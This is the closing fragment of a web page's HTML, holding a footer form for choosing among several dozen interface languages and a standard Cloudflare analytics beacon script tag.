            <form action="/changeLanguage" method="post" name="lang_form">
              <input type="hidden" value="" name="from_page" id="lang_from_page" />
              <select name="language" onchange="document.getElementById('lang_from_page').value = window.location.href; document.lang_form.submit()">
                <option value="en" selected="selected">English</option>
                <option value="zh_Hant">中文 (繁體)</option>
                <option value="zh_Hant_HK">中文 (香港)</option>
                <option value="zh_Hans_CN">中文 (简体)</option>
                <option value="ja">日本語</option>
                <option value="fil">Filipino</option>
                <option value="id">Bahasa Indonesia</option>
                <option value="ms">Bahasa Melayu</option>
                <option value="ru">Pусский</option>
                <option value="pt_BR">Português (Brasil)</option>
                <option value="hu">Magyar</option>
                <option value="fr">Français</option>
                <option value="es">Español</option>
                <option value="de">Deutsch</option>
                <option value="cs">Čeština</option>
                <option value="ar">العربية</option>
                <option value="ca">Català</option>
                <option value="da">Dansk</option>
                <option value="el">Ελληνικά</option>
                <option value="fa">فارسی</option>
                <option value="fi">Suomi</option>
                <option value="ga">Gaeilge</option>
                <option value="hi">Hindi</option>
                <option value="he">עברית</option>
                <option value="hr">Hrvatski</option>
                <option value="it">Italiano</option>
                <option value="nb">Norsk bokmål</option>
                <option value="nl">Nederlands</option>
                <option value="ko">한국어</option>
                <option value="pl">Polski</option>
                <option value="ro">Română</option>
                <option value="sk">Slovenský</option>
                <option value="sv">Svenska</option>
                <option value="tr">Türkçe</option>
                <option value="uk">українська</option>
                <option value="be">беларуская</option>
                <option value="th">ไทย</option>
              </select>
            </form>
          </i>
        </div>
      </div>
    </footer>
  </div>

  <script
    defer=""
    src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
    integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
    data-cf-beacon='{"rayId":"99e5687a9974a9ac","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.9.1","token":"f0f3f0d7075642cd877ac61c08650bb3"}'
    crossorigin="anonymous"></script>
</body>

</html>